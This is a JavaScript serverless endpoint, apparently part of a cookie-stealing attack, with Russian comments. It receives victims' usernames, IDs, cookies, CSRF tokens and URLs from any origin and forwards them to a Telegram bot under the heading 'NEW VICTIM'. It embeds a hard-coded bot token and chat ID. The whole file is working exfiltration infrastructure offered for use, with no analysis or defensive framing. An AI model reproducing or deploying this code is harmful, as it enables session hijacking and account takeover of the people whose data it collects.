// api/steal.js
export default async function handler(req, res) {
    // Разрешаем CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Получаем данные из GET или POST
    let data = req.method === 'GET' ? req.query : req.body;
    
    // Если данные пришли в поле 'data' как JSON-строка
    if (data.data) {
        try {
            data = JSON.parse(data.data);
        } catch(e) {}
    }

    // Формируем сообщение для Telegram
    const botToken = "8862863906:AAG08tI1oXDBPwgzxPeAFRTTcI6RdyKyyBo";
    const chatId = "8593964461";
    const message = `🛑 НОВАЯ ЖЕРТВА 🛑
    Username: ${data.username || 'Неизвестно'}
    ID: ${data.id || 'Неизвестно'}
    Cookies: ${data.cookies || 'Нет'}
    CSRF: ${data.csrf || 'Нет'}
    URL: ${data.url || 'Неизвестно'}`;

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
        });
        res.status(200).json({ status: 'ok' });
    } catch(e) {
        res.status(500).json({ status: 'error', message: e.message });
    }
}